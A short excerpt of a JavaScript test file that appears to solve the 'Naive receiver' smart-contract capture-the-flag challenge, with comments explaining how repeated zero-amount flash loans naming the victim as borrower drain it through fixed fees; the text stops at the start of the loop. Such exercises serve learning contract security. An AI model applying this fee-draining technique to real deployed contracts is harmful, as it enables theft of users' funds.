...
describe("[Challenge] Naive receiver", function () {
  ...
  it("Exploit", async function () {
    // ReceiveUnstoppable.receiveTokens does not check who is the original sender of the transaction
    // It only checks if the call is coming from the flashLoan
    // Call flashLoan with borrower the receiver, from the attacker address
    // Borrowing amount of 0 will just send back the FIXED_FEE
    for (let i = 0; i < 10; i++) {
